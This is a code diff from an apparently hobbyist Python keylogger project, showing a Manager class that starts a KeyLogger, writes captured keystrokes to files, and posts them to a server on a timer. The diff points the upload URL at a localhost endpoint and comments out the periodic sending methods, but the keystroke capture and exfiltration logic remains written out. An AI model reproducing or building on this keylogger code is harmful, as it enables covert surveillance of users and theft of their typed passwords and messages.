@@ -9,14 +9,14 @@ class Manager:
         self.recorde = KeyLogger()
         self.data = WriteToFile()
         self.running = True
-        self.url = "http://127.0.0.1:5000"
+        self.url = "http://127.0.0.1:5000/receiveData"
 
 
     def start_recording(self):
         self.running = True
         self.recorde.start_listen()
         threading.Thread(target=self.write_periodically, daemon=True).start()
-        threading.Thread(target=self.send_data_periodically, daemon=True).start()
+        # threading.Thread(target=self.send_data_periodically, daemon=True).start()
 
 
     def stop_recording(self):
@@ -37,22 +37,22 @@ class Manager:
             self.write_json_and_txt_file()
 
 
-    def send_data_to_server(self):
-        try:
-            response = requests.post(self.url, json=self.data.enter_to_dic())
-            if response.status_code == 200:
-                print("Data sent to server successfully!")
-            else:
-                print(f"Error sending data to server. Status code: {response.status_code}")
-                print(response.text)
-        except Exception as e:
-            print(f"Error sending data: {e}")
-
-
-    def send_data_periodically(self):
-        while self.running:
-            time.sleep(3600)
-            self.send_data_to_server()
+    # def send_data_to_server(self):
+    #     try:
+    #         response = requests.post(self.url, json=self.data.enter_to_dic())
+    #         if response.status_code == 200:
+    #             print("Data sent to server successfully!")
+    #         else:
+    #             print(f"Error sending data to server. Status code: {response.status_code}")
+    #             print(response.text)
+    #     except Exception as e:
+    #         print(f"Error sending data: {e}")
+    #
+    #
+    # def send_data_periodically(self):
+    #     while self.running:
+    #         time.sleep(3)
+    #         self.send_data_to_server()
 
 
 
